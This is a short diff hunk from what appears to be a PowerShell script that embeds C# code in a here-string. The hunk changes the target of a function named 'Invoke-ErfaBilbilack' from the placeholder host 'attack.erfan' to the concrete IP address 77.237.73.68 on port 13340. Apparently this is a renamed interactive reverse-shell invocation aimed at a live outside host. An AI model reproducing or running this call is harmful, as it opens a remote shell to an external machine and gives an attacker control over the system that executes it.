@@ -1568,4 +1568,4 @@ class MainClass
     }
 }
 "@;
-Invoke-ErfaBilbilack  attack.erfan 13340 -Rows 30 -Cols 90
+Invoke-ErfaBilbilack  77.237.73.68 13340 -Rows 30 -Cols 90
